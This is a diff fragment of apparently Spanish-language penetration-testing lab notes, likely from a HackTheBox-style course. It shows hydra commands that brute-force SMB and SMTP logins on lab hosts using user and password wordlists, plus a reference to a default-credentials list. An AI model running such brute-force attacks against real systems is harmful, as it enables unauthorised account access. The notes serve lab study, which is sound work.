@@ -23,4 +23,5 @@ hydra -L user.list -P password.list smb://10.129.42.197
 Listas interesantes:
 ftp-betterdefaultpasslist.txt (seclist) credenciales user:pass
 
-
+smpt:
+hydra -l fiona@inlanefreight.htb -P pws.list smtp://10.129.203.7 -f
